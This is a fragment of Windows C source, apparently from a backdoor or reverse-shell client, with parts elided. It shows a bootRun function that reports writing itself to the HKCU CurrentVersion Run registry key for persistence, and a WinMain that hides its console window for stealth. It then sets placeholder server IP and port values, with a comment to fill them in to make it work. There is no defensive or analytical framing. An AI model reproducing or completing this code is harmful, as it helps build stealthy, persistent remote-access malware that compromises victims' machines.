...
int bootRun(){
	char err[128] = "Failed\n";
	char suc[128] = "Success At : HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\n";
...
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){ //HINSTANCE --> use this val for win function, hprev --> x64, Cmd line--> command line , cmd show --> rend invisible le prgm
	HWND stealth;// -----
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); //--> permet de caché la console 
	...
	ServIP = "$IP";   // ------> change ip + port for working 
	ServPort= $PORT;
